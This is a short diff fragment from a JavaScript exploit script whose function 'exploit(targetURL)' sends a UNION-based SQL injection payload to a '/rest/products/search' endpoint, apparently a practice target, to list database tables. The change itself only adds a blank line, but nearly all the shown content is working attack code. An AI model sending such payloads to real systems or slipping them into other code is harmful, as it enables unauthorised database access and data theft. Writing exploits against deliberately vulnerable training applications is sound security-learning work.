@@ -36,6 +36,7 @@ async function exploit(targetURL){
 
     await new Promise(r => setTimeout(r, 1000));
     payload = "qwert')) UNION SELECT TABLE_NAME, 2, 3,4,5,6,7,8,9 FROM INFORMATION_SCHEMA.TABLES #"
+
     spinner.text = 'Successful SQL Injection: ' + payload;
     await http().get(targetURL + '/rest/products/search',{
         "q": payload
